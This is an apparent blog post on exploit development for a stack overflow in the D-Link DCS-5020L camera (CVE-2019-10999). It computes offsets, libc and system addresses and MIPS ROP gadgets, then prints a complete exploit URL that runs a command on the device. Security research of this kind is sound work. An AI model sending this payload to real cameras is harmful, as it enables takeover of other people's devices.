---
layout: post
title:  "D-Link DCS-5020L Vuln Assessment Pt. 4"
date:   2020-04-09 16:44:11 -0400
comments: true
categories: exploits
---

# Exploitation

## The Finale
This is the part you've been waiting for right? We've downloaded a firmware, 
scoured through it for hours, found a vulnerability, emulated it, and now it's 
time. Time to write an exploit to gain control of the camera and make it do our 
bidding. Or at least run a command we tell it to. In part 3 we overwrote the 
return address by sending an arbitrarily long string by holding down the A key 
for a while. This approach, while easy, is not very scientific and probably won't 
result in reliable control over where we jump. Whip out your calculator, it's 
time to do some math.

## The Stack
Before we get into overwriting the return address it's useful to know where
the return address is. But first, let's go over how the stack is laid out when
the vulnerable function is called. The stack will start at some high address,
typically I've seen 0x7FFFFFFF, and grow down in memory. Reads and writes go up 
in memory. Now, with that knowledge let's look at the prologue in the vulnerable 
function for a practical example.

![prologue]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/prologue.png)

The first operation, `addiu` (add immediate unsigned), will move our stack 
pointer down in memory which is how it allocates space for the function's local 
variables. The `sw` (store word) operations below that are saving registers on 
the stack so they can be restored after this function is complete. The remaining 
space on the stack that is not being used by the registers is for local variables. 
The top of the function's disassembly in IDA the offsets of variables on the 
stack and based off the prologue we can rename the variables to be more easily tracked.

![Renaming variables on the stack]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/stack_converted.png)

And what the stack actually looks like.

![Stack setup]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/stack_setup.png)

## That Little Bit of Math
Now we are ready to figure out how many 'A's to write to our buffer to control 
execution. Looking back at the `strcpy` in IDA, we need to find out which stack 
value is used as the destination buffer.

![string copy viewed in IDA]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/strcpy_ida.png)

Register `$a0` is populated with `var_30` which is the last piece of the puzzle. 
We now know where the destination buffer is on the stack and we also know where 
the return address is stored. Simple math time. Our buffer, `var_30`, is at 
offset -30 and the return address, `$ra`, is at offset -8 so the simple math to 
calculate the distance between the two is 0x30 minus 0x8 which equals 0x28. If 
we write 0x28 bytes (40 decimal) into the buffer that will take us right up to 
the return address. The next four bytes we write will overwrite the return 
address. A [wget](https://en.wikipedia.org/wiki/Wget) command combined with IDA 
debugging will prove if this value is correct. I went back to user mode 
emulation for this so I didn't have to worry about setting the referer or providing a password.

```bash
wget http://127.0.0.1/wireless.htm?WEPEncryption=$(python3 -c "print('A' * 0x28, end=''); print('BBBB')")
```

![Return address filled with BBBB]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/bbbb_ra.png)

Notice how `$ra` is filled with 42424242 (BBBB) now instead of 4141414 (AAAA) 
that we saw in part 3? We have successfully overwritten the return address and 
can control execution. The next step is identifying a useful address to jump to 
instead of 0x42424242.

## Returning to LibC
The best option for executing a command on this camera is to perform a
[return to libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack). 
This is one of a few options we have for exploiting the overflow, but this is 
the simplest option that will work. Basically we want to call system with a 
string we provide to perform a useful operation. Something like calling 
`/sbin/reboot` to restart the router. To accomplish this we need a few bits of information.

  * Address of libc.
  * Address of system.
  * Address of a gadget to place a string in $a0.
  * Offset on the stack to write our command.

Finding the address of libc is a pretty easy task. The kernel for this firmware 
is 2.6.21 and library load randomization wasn't a thing until 2.6.36 so the load 
address of the library will be consistent every time the server is run. Finding 
the address is as simple as a `cat` of the process mapping for this process. The 
library for libc in this firmware is libuClibc-0.9.28.so, notice how it appears 
in the mappings three times. We need to chose the executable one so we can 
execute code when we jump to it. To find that we are looking for the one with 
the `x` permission, or `r-xp`. Based on the image below our load address for libc is 0x2AB86000.

![Process Mapping]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/libc_address.png)

Finding the address of system requires loading the libc library in IDA and 
viewing the offset of the system function. Once found, adding that offset to 
the load address of libc will provide the address of system when the process is 
running. From the image below and the address we just found the loaded address of 
system will be

```
0x2AB86000 + 0x45080 = 0x2ABCB080
```

![System Call]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/system.png)

Next we need a gadget, known as a 
[ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) gadget, that 
will move a stack address into `$a0`, move an `$s` register to `$t9`, and call 
`$t9`. This will allow us to call system with a command we provide in the 
overflow. Sadly, there are no usable gadgets that move a stack pointer to `$a0` 
and call an `$s` register so this exploit required two gadgets. The two gadgets 
from libc I chose are:

        ----------------------------------------------------------------
        | Gadget Name | Gadget Offset | Gadget Summary                 |
        ----------------------------------------------------------------
        | ROP1        | 0x0004B0F8    | move    $t9, $s0               |
        |             |               | jalr    $t9 ; sub_4A890        |
        |             |               | addiu   $s2, $sp, 0x1E8+var_F8 |
        ----------------------------------------------------------------
        | ROP2        | 0x00018F40    | move    $t9, $s1               |
        |             |               | jalr    $t9 ; sub_18EB0        |
        |             |               | move    $a0, $s2               |
        ----------------------------------------------------------------
Because both gadgets came from libc the math to find their loaded address is the same.

* ROP1 - `0x2AB86000 + 0x4B0F8 = 0x2ABD10F8`
* ROP2 - `0x2AB86000 + 0x18F40 = 0x2AB9EF40`

ROP1 will perform the task of moving a stack value from an offset into an `$s` 
register. This operation happens in the third line of the gadget 
`addiu $s2, $sp, 0x1E8+var_F8`. The string will come from offset 
`0x1E8 - 0xF8 = 0xF0` and be stored in register `$s2`.

ROP2 will perform the task of moving a function pointer from an `$s` register 
to `$t9`, moving an `$s` register to `$a0`, and calling `$t9`. In our case we 
will put the address of `sytem` in `$s1`, so it will be moved to `$t9`. We 
placed our string in `$s2` in the last gadget and it will be moved to `$a0` to 
be the paramter when calling system.

Given all this information we need our stack to look like this:

![ROP Stack]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/rop_stack.png)

The addresses are sent in reverse because this is a little endian architecture 
firmware. The new URL looks like this:

http://IP:PORT/wireless.htm?WEPEncryption=AAAAAAAAAAAAAAAA@%EF%B9%2A%80%B0%BC%2AAAAAAAAAAAAAAAAA%F8%10%BD%2AAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB/sbin/reboot

If everything works out this should call `system` with the parameter 
`/sbin/reboot` which means we can run any command we want.

![ROP to system]({{site.baseurl}}/assets/images/dcs-5020l/dcs-5020L_4_img/system_rop.png)

## Conclusion
I'm in.

This bug is present if a few different D-Link cameras and has been patched in a 
few of them already. A few, sadly, remain unpatched at the time of writing. 
Might be a different story when you are reading this. If you want full source 
code for this exploit you can grab it on my github [here](https://github.com/fuzzywalls/CVE-2019-10999).
The CVE number is [CVE-2019-10999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10999).
Thanks for reading, come back for more exploits later!
